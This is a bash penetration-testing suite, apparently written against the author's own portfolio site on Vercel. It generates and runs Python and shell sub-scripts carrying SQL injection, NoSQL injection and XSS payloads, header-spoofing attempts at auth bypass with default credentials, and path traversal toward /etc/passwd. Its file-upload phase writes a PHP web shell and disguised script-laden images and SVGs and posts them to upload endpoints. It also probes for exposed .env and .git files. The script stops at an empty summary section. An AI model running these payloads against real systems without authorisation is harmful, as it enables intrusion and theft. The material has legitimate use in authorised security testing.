#!/bin/bash

# Comprehensive Portfolio Application Penetration Testing Suite
# Target: https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app/
# This script tests all APIs, endpoints, and admin functions for vulnerabilities

TARGET_URL="https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
OUTPUT_DIR="./pentest_results_$(date +%Y%m%d_%H%M%S)"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

echo -e "${BLUE}🔥 COMPREHENSIVE PORTFOLIO PENETRATION TEST${NC}"
echo -e "${BLUE}Target: ${TARGET_URL}${NC}"
echo -e "${BLUE}Timestamp: ${TIMESTAMP}${NC}"
echo -e "${BLUE}Output Directory: ${OUTPUT_DIR}${NC}"

# Create output directory
mkdir -p "$OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR/api_tests"
mkdir -p "$OUTPUT_DIR/admin_tests"
mkdir -p "$OUTPUT_DIR/injection_tests"
mkdir -p "$OUTPUT_DIR/xss_tests"
mkdir -p "$OUTPUT_DIR/bypass_tests"

# Function to print section headers
print_header() {
    echo -e "\n${YELLOW}=================================${NC}"
    echo -e "${YELLOW}    $1${NC}"
    echo -e "${YELLOW}=================================${NC}"
}

# Function to run test and save output
run_test() {
    local test_name="$1"
    local command="$2"
    local output_file="$OUTPUT_DIR/${test_name}_${TIMESTAMP}.txt"
    
    echo -e "${GREEN}🔍 Running: $test_name${NC}"
    echo "Command: $command" > "$output_file"
    echo "Timestamp: $(date)" >> "$output_file"
    echo "----------------------------------------" >> "$output_file"
    
    eval "$command" >> "$output_file" 2>&1
    local exit_code=$?
    
    if [ $exit_code -eq 0 ]; then
        echo -e "${GREEN}✓ Test completed: $test_name${NC}"
    else
        echo -e "${RED}⚠ Test failed: $test_name (Exit code: $exit_code)${NC}"
    fi
    
    echo -e "${CYAN}📄 Results: $output_file${NC}"
}

print_header "PHASE 1: RECONNAISSANCE & INFORMATION GATHERING"

# Basic reconnaissance
run_test "whatweb_scan" "whatweb '$TARGET_URL'"
run_test "nmap_scan" "nmap -sV -sC -p 80,443 my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
run_test "http_headers" "curl -I '$TARGET_URL'"
run_test "robots_check" "curl -s '$TARGET_URL/robots.txt'"
run_test "sitemap_check" "curl -s '$TARGET_URL/sitemap.xml'"

# Technology stack identification
run_test "tech_stack" "curl -s '$TARGET_URL' | grep -i -E '(react|vue|angular|next|vite|webpack)'"

print_header "PHASE 2: DIRECTORY & ENDPOINT DISCOVERY"

# Directory bruteforcing
run_test "dirb_scan" "dirb '$TARGET_URL' /usr/share/wordlists/dirb/common.txt -o '$OUTPUT_DIR/dirb_detailed.txt'"
run_test "gobuster_scan" "gobuster dir -u '$TARGET_URL' -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x js,json,txt,xml,php,html"

# API endpoint discovery
api_endpoints=(
    "/api"
    "/api/auth"
    "/api/admin"
    "/api/contact"
    "/api/projects"
    "/api/users"
    "/api/upload"
    "/api/login"
    "/api/logout"
    "/api/profile"
    "/api/settings"
    "/api/messages"
    "/api/media"
    "/api/analytics"
    "/graphql"
    "/api/graphql"
    "/.well-known"
    "/.env"
    "/config.json"
)

echo "=== API Endpoint Discovery ===" > "$OUTPUT_DIR/api_discovery.txt"
for endpoint in "${api_endpoints[@]}"; do
    echo "Testing: $TARGET_URL$endpoint" >> "$OUTPUT_DIR/api_discovery.txt"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
    echo "  Status: $response" >> "$OUTPUT_DIR/api_discovery.txt"
    if [ "$response" != "404" ] && [ "$response" != "000" ]; then
        echo "  🎯 FOUND: $endpoint (Status: $response)" >> "$OUTPUT_DIR/api_discovery.txt"
    fi
done

print_header "PHASE 3: ADMIN FUNCTION ENUMERATION"

# Admin endpoint discovery
admin_endpoints=(
    "/admin"
    "/admin/login"
    "/admin/dashboard"
    "/admin/projects"
    "/admin/hero"
    "/admin/about"
    "/admin/skills"
    "/admin/contact"
    "/admin/messages"
    "/admin/media"
    "/admin/users"
    "/admin/settings"
    "/admin/analytics"
    "/admin/upload"
    "/admin/profile"
    "/administration"
    "/administrator"
    "/manage"
    "/management"
    "/panel"
    "/cp"
    "/controlpanel"
)

echo "=== Admin Endpoint Discovery ===" > "$OUTPUT_DIR/admin_discovery.txt"
for endpoint in "${admin_endpoints[@]}"; do
    echo "Testing: $TARGET_URL$endpoint" >> "$OUTPUT_DIR/admin_discovery.txt"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$endpoint")
    size=$(curl -s "$TARGET_URL$endpoint" | wc -c)
    echo "  Status: $response | Size: $size bytes" >> "$OUTPUT_DIR/admin_discovery.txt"
    
    # Check for admin indicators in response
    if [ "$response" = "200" ]; then
        content=$(curl -s "$TARGET_URL$endpoint" | tr '[:upper:]' '[:lower:]')
        if echo "$content" | grep -q -E "(admin|dashboard|management|control)"; then
            echo "  🚨 POTENTIAL ADMIN PANEL: $endpoint" >> "$OUTPUT_DIR/admin_discovery.txt"
        fi
    fi
done

print_header "PHASE 4: AUTHENTICATION BYPASS TESTING"

# Create comprehensive bypass test script
cat > "$OUTPUT_DIR/bypass_tests/auth_bypass_test.sh" << 'EOF'
#!/bin/bash

TARGET="https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
OUTPUT="./auth_bypass_results.txt"

echo "=== AUTHENTICATION BYPASS TESTING ===" > $OUTPUT
echo "Target: $TARGET" >> $OUTPUT
echo "Timestamp: $(date)" >> $OUTPUT
echo "" >> $OUTPUT

# Test 1: User-Agent Bypass
echo "1. Testing User-Agent Bypass..." >> $OUTPUT
user_agents=(
    "Googlebot/2.1 (+http://www.google.com/bot.html)"
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
    "Twitterbot/1.0"
    "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/)"
    "WhatsApp/2.0"
    "TelegramBot (like TwitterBot)"
    "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
    "Vercel-Bot/1.0"
    "curl/7.0"
)

for ua in "${user_agents[@]}"; do
    response=$(curl -X POST "$TARGET/admin/login" \
        -H "Content-Type: application/json" \
        -H "User-Agent: $ua" \
        -d '{"email":"admin","password":"admin"}' \
        -w "Status: %{http_code} | Size: %{size_download}" \
        -s -o /dev/null)
    echo "  User-Agent: $ua -> $response" >> $OUTPUT
done

# Test 2: HTTP Method Override
echo "" >> $OUTPUT
echo "2. Testing HTTP Method Override..." >> $OUTPUT
methods=("GET" "PUT" "PATCH" "DELETE" "OPTIONS" "HEAD")
for method in "${methods[@]}"; do
    response=$(curl -X $method "$TARGET/admin/login" \
        -H "Content-Type: application/json" \
        -d '{"email":"admin","password":"admin"}' \
        -w "Status: %{http_code}" \
        -s -o /dev/null)
    echo "  Method $method: $response" >> $OUTPUT
done

# Test 3: IP Spoofing
echo "" >> $OUTPUT
echo "3. Testing IP Spoofing..." >> $OUTPUT
ips=("127.0.0.1" "10.0.0.1" "192.168.1.1" "8.8.8.8" "1.1.1.1" "0.0.0.0")
for ip in "${ips[@]}"; do
    response=$(curl -X POST "$TARGET/admin/login" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $ip" \
        -H "X-Real-IP: $ip" \
        -H "X-Originating-IP: $ip" \
        -d '{"email":"admin","password":"admin"}' \
        -w "Status: %{http_code}" \
        -s -o /dev/null)
    echo "  IP $ip: $response" >> $OUTPUT
done

# Test 4: Referrer Bypass
echo "" >> $OUTPUT
echo "4. Testing Referrer Bypass..." >> $OUTPUT
referrers=(
    "https://vercel.com/"
    "https://google.com/"
    "https://github.com/"
    "$TARGET/"
    "https://localhost:3000/"
)
for ref in "${referrers[@]}"; do
    response=$(curl -X POST "$TARGET/admin/login" \
        -H "Content-Type: application/json" \
        -H "Referer: $ref" \
        -d '{"email":"admin","password":"admin"}' \
        -w "Status: %{http_code}" \
        -s -o /dev/null)
    echo "  Referrer $ref: $response" >> $OUTPUT
done

echo "" >> $OUTPUT
echo "=== BYPASS TEST COMPLETED ===" >> $OUTPUT
EOF

chmod +x "$OUTPUT_DIR/bypass_tests/auth_bypass_test.sh"
run_test "auth_bypass" "cd '$OUTPUT_DIR/bypass_tests' && ./auth_bypass_test.sh"

print_header "PHASE 5: SQL INJECTION TESTING"

# Create SQL injection test script
cat > "$OUTPUT_DIR/injection_tests/sql_injection_test.py" << 'EOF'
#!/usr/bin/env python3

import requests
import json
import time

TARGET = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

# SQL Injection payloads
sql_payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "'; DROP TABLE projects; --",
    "' UNION SELECT @@version --",
    "' UNION SELECT user() --",
    "' UNION SELECT password FROM users --",
    "admin'/*",
    "admin'||'a'='a",
    "admin' OR (SELECT pg_sleep(5)) --",
    "admin' AND (SELECT * FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    "admin'; INSERT INTO users VALUES('hacker','password') --",
    "' OR 1=1 LIMIT 1 --",
    "' UNION ALL SELECT NULL,NULL,NULL --",
    "admin' OR 'x'='x",
    "1' ORDER BY 1 --",
    "1' ORDER BY 2 --",
    "1' ORDER BY 3 --",
    "1' UNION SELECT 1,2,3 --",
    "admin' AND substring(@@version,1,1)='5",
    "admin' AND (ascii(substring((SELECT @@version),1,1)))>52 --"
]

print("=== SQL INJECTION TESTING ===")
print(f"Target: {TARGET}")
print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Test admin login
print("1. Testing Admin Login SQL Injection...")
for i, payload in enumerate(sql_payloads, 1):
    try:
        data = {"email": payload, "password": "test"}
        response = requests.post(
            f"{TARGET}/admin/login",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"  Payload {i:2d}: {payload[:30]:<30} -> Status: {response.status_code} | Size: {len(response.text)}")
        
        # Check for SQL errors
        error_keywords = ['sql', 'syntax', 'mysql', 'postgres', 'database', 'query', 'error']
        response_lower = response.text.lower()
        
        for keyword in error_keywords:
            if keyword in response_lower:
                print(f"    🚨 POTENTIAL SQL ERROR: Found '{keyword}' in response!")
                break
                
        # Check for time delay (SQL injection with time delay)
        if "pg_sleep" in payload:
            if response.elapsed.total_seconds() > 4:
                print(f"    🚨 POTENTIAL TIME-BASED INJECTION: Response took {response.elapsed.total_seconds():.2f} seconds!")
                
        time.sleep(0.5)  # Rate limiting
        
    except Exception as e:
        print(f"  Payload {i:2d}: Error - {e}")

# Test contact form
print("\n2. Testing Contact Form SQL Injection...")
for i, payload in enumerate(sql_payloads[:10], 1):  # Test first 10 payloads
    try:
        data = {"name": payload, "email": "test@test.com", "message": "SQL injection test"}
        response = requests.post(
            f"{TARGET}/api/contact",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"  Payload {i:2d}: {payload[:30]:<30} -> Status: {response.status_code}")
        
        if response.status_code == 500:
            print(f"    🚨 SERVER ERROR: Possible SQL injection vulnerability!")
            
        time.sleep(0.5)
        
    except Exception as e:
        print(f"  Payload {i:2d}: Error - {e}")

print("\n=== SQL INJECTION TEST COMPLETED ===")
EOF

chmod +x "$OUTPUT_DIR/injection_tests/sql_injection_test.py"
run_test "sql_injection" "cd '$OUTPUT_DIR/injection_tests' && python3 sql_injection_test.py"

print_header "PHASE 6: XSS VULNERABILITY TESTING"

# Create XSS test script
cat > "$OUTPUT_DIR/xss_tests/xss_test.py" << 'EOF'
#!/usr/bin/env python3

import requests
import json
import time

TARGET = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

# XSS payloads
xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    '"><script>alert("XSS")</script>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload=alert("XSS")>',
    '<div onclick=alert("XSS")>Click</div>',
    '<input onfocus=alert("XSS") autofocus>',
    '<select onfocus=alert("XSS") autofocus>',
    '<textarea onfocus=alert("XSS") autofocus>',
    '<keygen onfocus=alert("XSS") autofocus>',
    '<video><source onerror="alert(\'XSS\')">',
    '<audio src=x onerror=alert("XSS")>',
    '<details open ontoggle=alert("XSS")>',
    '<marquee onstart=alert("XSS")>',
    'javascript:alert("XSS")',
    '<script src="data:text/javascript,alert(\'XSS\')"></script>',
    '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
    '<embed src="data:text/html,<script>alert(\'XSS\')</script>">',
    '<form><input formaction="javascript:alert(\'XSS\')">'
]

print("=== XSS VULNERABILITY TESTING ===")
print(f"Target: {TARGET}")
print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Test contact form
print("1. Testing Contact Form XSS...")
for i, payload in enumerate(xss_payloads, 1):
    try:
        # Test in name field
        data = {"name": payload, "email": "test@test.com", "message": "XSS test"}
        response = requests.post(
            f"{TARGET}/api/contact",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"  Name XSS {i:2d}: {payload[:40]:<40} -> Status: {response.status_code}")
        
        # Check if payload is reflected
        if payload in response.text:
            print(f"    🚨 REFLECTED XSS: Payload found in response!")
            
        # Test in message field
        data = {"name": "Test", "email": "test@test.com", "message": payload}
        response = requests.post(
            f"{TARGET}/api/contact",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"  Msg XSS {i:2d}: {payload[:40]:<40} -> Status: {response.status_code}")
        
        if payload in response.text:
            print(f"    🚨 REFLECTED XSS: Payload found in response!")
            
        time.sleep(0.3)
        
    except Exception as e:
        print(f"  XSS {i:2d}: Error - {e}")

# Test URL parameters
print("\n2. Testing URL Parameter XSS...")
url_params = ['q', 'search', 'name', 'id', 'page', 'category', 'tag']
for param in url_params:
    for payload in xss_payloads[:5]:  # Test first 5 payloads
        try:
            response = requests.get(
                f"{TARGET}/?{param}={payload}",
                timeout=10
            )
            
            print(f"  URL XSS {param}: {payload[:30]:<30} -> Status: {response.status_code}")
            
            if payload in response.text:
                print(f"    🚨 REFLECTED XSS: Payload found in response!")
                
        except Exception as e:
            print(f"  URL XSS {param}: Error - {e}")

print("\n=== XSS TEST COMPLETED ===")
EOF

chmod +x "$OUTPUT_DIR/xss_tests/xss_test.py"
run_test "xss_testing" "cd '$OUTPUT_DIR/xss_tests' && python3 xss_test.py"

print_header "PHASE 7: NOSQL INJECTION TESTING"

# Create NoSQL injection test script
cat > "$OUTPUT_DIR/injection_tests/nosql_injection_test.py" << 'EOF'
#!/usr/bin/env python3

import requests
import json
import time

TARGET = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

print("=== NOSQL INJECTION TESTING ===")
print(f"Target: {TARGET}")
print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print()

# NoSQL injection payloads
nosql_payloads = [
    '{"email":{"$ne":""},"password":{"$ne":""}}',
    '{"email":{"$regex":".*"},"password":{"$regex":".*"}}',
    '{"email":{"$exists":true},"password":{"$exists":true}}',
    '{"email":{"$in":["admin","administrator"]},"password":{"$ne":""}}',
    '{"email":{"$gt":""},"password":{"$gt":""}}',
    '{"email":{"$where":"function(){return true}"},"password":"test"}',
    '{"email":{"$or":[{"a":"a"},{"b":"b"}]},"password":"test"}',
    '{"email":{"$and":[{"a":"a"},{"b":"b"}]},"password":"test"}',
    '{"email":{"$nin":[""],"password":{"$nin":[""]}}',
    '{"email":{"$elemMatch":{"a":"a"}},"password":"test"}',
    '{"email":{"$size":1},"password":"test"}',
    '{"email":{"$type":"string"},"password":"test"}',
    '{"email":{"$mod":[10,1]},"password":"test"}',
    '{"email":{"$all":["admin"]},"password":"test"}',
    '{"email":{"$slice":1},"password":"test"}'
]

print("Testing NoSQL Injection in Admin Login...")
for i, payload in enumerate(nosql_payloads, 1):
    try:
        response = requests.post(
            f"{TARGET}/admin/login",
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        
        print(f"  NoSQL {i:2d}: Status: {response.status_code} | Size: {len(response.text)}")
        
        # Check for success indicators
        success_indicators = ['welcome', 'dashboard', 'admin', 'success', 'token', 'jwt']
        response_lower = response.text.lower()
        
        if any(indicator in response_lower for indicator in success_indicators):
            print(f"    🚨 POTENTIAL BYPASS: Success indicators found!")
            
        # Check for different response than normal 401
        if response.status_code != 401:
            print(f"    🚨 UNUSUAL RESPONSE: Expected 401, got {response.status_code}")
            
        time.sleep(0.5)
        
    except json.JSONDecodeError:
        print(f"  NoSQL {i:2d}: Invalid JSON payload")
    except Exception as e:
        print(f"  NoSQL {i:2d}: Error - {e}")

print("\n=== NOSQL INJECTION TEST COMPLETED ===")
EOF

chmod +x "$OUTPUT_DIR/injection_tests/nosql_injection_test.py"
run_test "nosql_injection" "cd '$OUTPUT_DIR/injection_tests' && python3 nosql_injection_test.py"

print_header "PHASE 8: ADMIN FUNCTION VULNERABILITY TESTING"

# Create admin function test script
cat > "$OUTPUT_DIR/admin_tests/admin_function_test.py" << 'EOF'
#!/usr/bin/env python3

import requests
import json
import time

TARGET = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

print("=== ADMIN FUNCTION VULNERABILITY TESTING ===")
print(f"Target: {TARGET}")
print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Admin endpoints to test
admin_endpoints = [
    "/admin/dashboard",
    "/admin/projects",
    "/admin/hero",
    "/admin/about", 
    "/admin/skills",
    "/admin/contact",
    "/admin/messages",
    "/admin/media",
    "/admin/users",
    "/admin/settings",
    "/admin/upload",
    "/admin/analytics"
]

# Test 1: Direct access without authentication
print("1. Testing Direct Access to Admin Functions...")
for endpoint in admin_endpoints:
    try:
        response = requests.get(f"{TARGET}{endpoint}", timeout=10)
        print(f"  GET {endpoint:<20} -> Status: {response.status_code} | Size: {len(response.text)}")
        
        # Check for admin content without login
        admin_indicators = ['admin', 'dashboard', 'management', 'control panel']
        login_indicators = ['login', 'sign in', 'authenticate']
        
        response_text = response.text.lower()
        has_admin_content = any(indicator in response_text for indicator in admin_indicators)
        has_login_prompt = any(indicator in response_text for indicator in login_indicators)
        
        if response.status_code == 200 and has_admin_content and not has_login_prompt:
            print(f"    🚨 CRITICAL: Admin panel accessible without authentication!")
            
    except Exception as e:
        print(f"  GET {endpoint:<20} -> Error: {e}")

# Test 2: HTTP method testing
print("\n2. Testing HTTP Methods on Admin Endpoints...")
methods = ["POST", "PUT", "PATCH", "DELETE", "OPTIONS"]
for method in methods:
    for endpoint in admin_endpoints[:5]:  # Test first 5 endpoints
        try:
            response = requests.request(method, f"{TARGET}{endpoint}", timeout=5)
            print(f"  {method:<6} {endpoint:<20} -> Status: {response.status_code}")
            
            if response.status_code not in [401, 403, 404, 405]:
                print(f"    🚨 UNUSUAL RESPONSE: {method} {endpoint} returned {response.status_code}")
                
        except Exception as e:
            print(f"  {method:<6} {endpoint:<20} -> Error: {e}")

# Test 3: Admin API testing with fake authentication
print("\n3. Testing Admin APIs with Fake Authentication...")
fake_headers = [
    {"Authorization": "Bearer admin_token"},
    {"Authorization": "Bearer fake_jwt_token"},
    {"Cookie": "admin=true; authenticated=1"},
    {"X-Admin": "true"},
    {"X-Auth": "admin"},
    {"Cookie": "sb-access-token=fake_token"}
]

for headers in fake_headers:
    for endpoint in admin_endpoints[:3]:  # Test first 3 endpoints
        try:
            response = requests.get(f"{TARGET}{endpoint}", headers=headers, timeout=5)
            print(f"  {str(headers)[:40]:<40} {endpoint} -> {response.status_code}")
            
            if response.status_code == 200:
                print(f"    🚨 POTENTIAL BYPASS: Fake auth accepted!")
                
        except Exception as e:
            print(f"  {str(headers)[:40]:<40} {endpoint} -> Error")

# Test 4: Admin function injection
print("\n4. Testing Admin Function Injection...")
injection_payloads = [
    '{"title":"<script>alert(\\"Admin XSS\\")</script>"}',
    '{"name":"\\'; DROP TABLE projects; --"}',
    '{"description":{"$ne":""}}',
    '{"id":"../../../etc/passwd"}',
    '{"file":"shell.php"}'
]

for payload in injection_payloads:
    try:
        response = requests.post(
            f"{TARGET}/admin/projects",
            data=payload,
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        print(f"  Admin Injection: {payload[:30]:<30} -> Status: {response.status_code}")
        
        if response.status_code in [200, 201]:
            print(f"    🚨 POTENTIAL INJECTION: Payload accepted!")
            
    except Exception as e:
        print(f"  Admin Injection: Error - {e}")

print("\n=== ADMIN FUNCTION TEST COMPLETED ===")
EOF

chmod +x "$OUTPUT_DIR/admin_tests/admin_function_test.py"
run_test "admin_function_test" "cd '$OUTPUT_DIR/admin_tests' && python3 admin_function_test.py"

print_header "PHASE 9: FILE UPLOAD VULNERABILITY TESTING"

# Create file upload test script
cat > "$OUTPUT_DIR/admin_tests/file_upload_test.sh" << 'EOF'
#!/bin/bash

TARGET="https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"
OUTPUT="./file_upload_results.txt"

echo "=== FILE UPLOAD VULNERABILITY TESTING ===" > $OUTPUT
echo "Target: $TARGET" >> $OUTPUT
echo "Timestamp: $(date)" >> $OUTPUT
echo "" >> $OUTPUT

# Create malicious files
echo '<?php system($_GET["cmd"]); ?>' > shell.php
echo '<script>alert("XSS")</script>' > xss.html
echo '#!/bin/bash\necho "Shell script executed"' > shell.sh
echo 'GIF89a<script>alert("XSS")</script>' > fake.gif
echo -e '\x89PNG\r\n\x1a\n<script>alert("XSS")</script>' > fake.png

# SVG with XSS
cat > malicious.svg << 'SVGEOF'
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS in SVG')">
<rect width="100" height="100" fill="red"/>
</svg>
SVGEOF

echo "Testing file upload endpoints..." >> $OUTPUT

upload_endpoints=(
    "/api/upload"
    "/admin/upload"
    "/api/media"
    "/upload"
    "/api/admin/upload"
    "/api/admin/media"
)

files=("shell.php" "xss.html" "shell.sh" "fake.gif" "fake.png" "malicious.svg")

for endpoint in "${upload_endpoints[@]}"; do
    echo "" >> $OUTPUT
    echo "Testing endpoint: $endpoint" >> $OUTPUT
    
    for file in "${files[@]}"; do
        if [ -f "$file" ]; then
            response=$(curl -X POST "$TARGET$endpoint" \
                -F "file=@$file" \
                -w "Status: %{http_code} | Size: %{size_download}" \
                -s -o /dev/null)
            echo "  File: $file -> $response" >> $OUTPUT
            
            # Test with different parameter names
            response2=$(curl -X POST "$TARGET$endpoint" \
                -F "upload=@$file" \
                -w "Status: %{http_code}" \
                -s -o /dev/null)
            echo "  File: $file (as 'upload') -> $response2" >> $OUTPUT
            
            # Test with image type override
            response3=$(curl -X POST "$TARGET$endpoint" \
                -F "file=@$file" \
                -F "type=image" \
                -w "Status: %{http_code}" \
                -s -o /dev/null)
            echo "  File: $file (type=image) -> $response3" >> $OUTPUT
        fi
    done
done

# Test double extension bypass
echo "" >> $OUTPUT
echo "Testing double extension bypass..." >> $OUTPUT
cp shell.php shell.jpg.php
cp xss.html xss.png.html

for endpoint in "${upload_endpoints[@]}"; do
    for file in "shell.jpg.php" "xss.png.html"; do
        if [ -f "$file" ]; then
            response=$(curl -X POST "$TARGET$endpoint" \
                -F "file=@$file" \
                -w "Status: %{http_code}" \
                -s -o /dev/null)
            echo "  Double ext: $file -> $response" >> $OUTPUT
        fi
    done
done

# Cleanup
rm -f shell.php xss.html shell.sh fake.gif fake.png malicious.svg shell.jpg.php xss.png.html

echo "" >> $OUTPUT
echo "=== FILE UPLOAD TEST COMPLETED ===" >> $OUTPUT
EOF

chmod +x "$OUTPUT_DIR/admin_tests/file_upload_test.sh"
run_test "file_upload_test" "cd '$OUTPUT_DIR/admin_tests' && ./file_upload_test.sh"

print_header "PHASE 10: SECURITY HEADERS & CONFIGURATION ANALYSIS"

# Security headers analysis
run_test "security_headers" "python3 -c \"
import requests
try:
    response = requests.get('$TARGET_URL', timeout=10)
    print('=== Response Headers ===')
    for header, value in response.headers.items():
        print(f'{header}: {value}')
    
    print('\n=== Security Headers Check ===')
    security_headers = [
        'Content-Security-Policy',
        'X-Frame-Options', 
        'X-XSS-Protection',
        'Strict-Transport-Security',
        'X-Content-Type-Options',
        'Referrer-Policy',
        'Permissions-Policy'
    ]
    
    for header in security_headers:
        if header in response.headers:
            print(f'✓ {header}: {response.headers[header]}')
        else:
            print(f'✗ {header}: MISSING')
            
except Exception as e:
    print(f'Error: {e}')
\""

# SSL/TLS testing
run_test "ssl_test" "testssl.sh '$TARGET_URL' --quiet"

print_header "PHASE 11: AUTOMATED VULNERABILITY SCANNING"

# Nikto scan
run_test "nikto_scan" "nikto -h '$TARGET_URL' -Format txt -output '$OUTPUT_DIR/nikto_detailed.txt'"

# Nuclei scan (if available)
if command -v nuclei &> /dev/null; then
    run_test "nuclei_scan" "nuclei -u '$TARGET_URL' -t /root/nuclei-templates/ -o '$OUTPUT_DIR/nuclei_results.txt'"
else
    echo -e "${YELLOW}⚠ Nuclei not found. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest${NC}"
fi

print_header "PHASE 12: BUSINESS LOGIC TESTING"

# Create business logic test script
cat > "$OUTPUT_DIR/admin_tests/business_logic_test.py" << 'EOF'
#!/usr/bin/env python3

import requests
import json
import time
import threading

TARGET = "https://my-digital-portfolio-git-main-sajal-basnets-projects.vercel.app"

print("=== BUSINESS LOGIC VULNERABILITY TESTING ===")
print(f"Target: {TARGET}")
print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
print()

# Test 1: Race Condition Testing
print("1. Testing Race Conditions...")
def make_request(i):
    try:
        data = {"name": f"Race Test {i}", "description": "Testing race conditions"}
        response = requests.post(
            f"{TARGET}/api/contact",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        print(f"  Race {i:2d}: Status {response.status_code}")
    except Exception as e:
        print(f"  Race {i:2d}: Error - {e}")

threads = []
for i in range(10):
    thread = threading.Thread(target=make_request, args=(i,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()

# Test 2: Rate Limiting
print("\n2. Testing Rate Limiting...")
for i in range(20):
    try:
        data = {"email": "admin", "password": "admin"}
        response = requests.post(
            f"{TARGET}/admin/login",
            json=data,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        print(f"  Rate {i+1:2d}: Status {response.status_code}")
        
        if response.status_code == 429:
            print(f"    ✓ Rate limiting detected at request {i+1}")
            break
        elif response.status_code != 401:
            print(f"    🚨 UNUSUAL RESPONSE: Expected 401, got {response.status_code}")
            
        time.sleep(0.1)
    except Exception as e:
        print(f"  Rate {i+1:2d}: Error - {e}")

# Test 3: Input Validation Bypass
print("\n3. Testing Input Validation Bypass...")
bypass_payloads = [
    {"name": "", "email": "test@test.com", "message": "Empty name test"},
    {"name": "A" * 1000, "email": "test@test.com", "message": "Long name test"},
    {"name": "Test", "email": "invalid-email", "message": "Invalid email test"},
    {"name": "Test", "email": "", "message": "Empty email test"},
    {"name": "Test", "email": "test@test.com", "message": ""},
    {"name": None, "email": "test@test.com", "message": "Null name test"},
    {"name": 123, "email": "test@test.com", "message": "Number name test"},
    {"name": [], "email": "test@test.com", "message": "Array name test"},
    {"name": {}, "email": "test@test.com", "message": "Object name test"}
]

for i, payload in enumerate(bypass_payloads, 1):
    try:
        response = requests.post(
            f"{TARGET}/api/contact",
            json=payload,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        print(f"  Bypass {i:2d}: {str(payload)[:50]:<50} -> Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"    🚨 VALIDATION BYPASS: Invalid input accepted!")
            
    except Exception as e:
        print(f"  Bypass {i:2d}: Error - {e}")

print("\n=== BUSINESS LOGIC TEST COMPLETED ===")
EOF

chmod +x "$OUTPUT_DIR/admin_tests/business_logic_test.py"
run_test "business_logic_test" "cd '$OUTPUT_DIR/admin_tests' && python3 business_logic_test.py"

print_header "PHASE 13: INFORMATION DISCLOSURE TESTING"

# Test for exposed files and information
sensitive_files=(
    "/.env"
    "/.env.local"
    "/.env.production"
    "/package.json"
    "/.git/config"
    "/webpack.config.js"
    "/vite.config.js"
    "/tsconfig.json"
    "/vercel.json"
    "/.vercel"
    "/config.json"
    "/backup"
    "/backup.zip"
    "/database.sql"
    "/.DS_Store"
    "/web.config"
    "/.htaccess"
    "/server.js"
    "/app.js"
    "/index.js"
    "/.gitignore"
    "/yarn.lock"
    "/package-lock.json"
)

echo "=== Information Disclosure Testing ===" > "$OUTPUT_DIR/info_disclosure.txt"
for file in "${sensitive_files[@]}"; do
    echo "Testing: $TARGET_URL$file" >> "$OUTPUT_DIR/info_disclosure.txt"
    response=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$file")
    size=$(curl -s "$TARGET_URL$file" | wc -c)
    echo "  Status: $response | Size: $size bytes" >> "$OUTPUT_DIR/info_disclosure.txt"
    
    if [ "$response" = "200" ] && [ "$size" -gt "10" ]; then
        echo "  🚨 FOUND: $TARGET_URL$file (Status: $response, Size: $size bytes)" >> "$OUTPUT_DIR/info_disclosure.txt"
        # Download the file for analysis
        curl -s "$TARGET_URL$file" > "$OUTPUT_DIR/exposed_$(basename $file).txt"
        echo "  📁 Downloaded to: exposed_$(basename $file).txt" >> "$OUTPUT_DIR/info_disclosure.txt"
    fi
done

print_header "RESULTS SUMMARY"

# Generate comprehensive summary
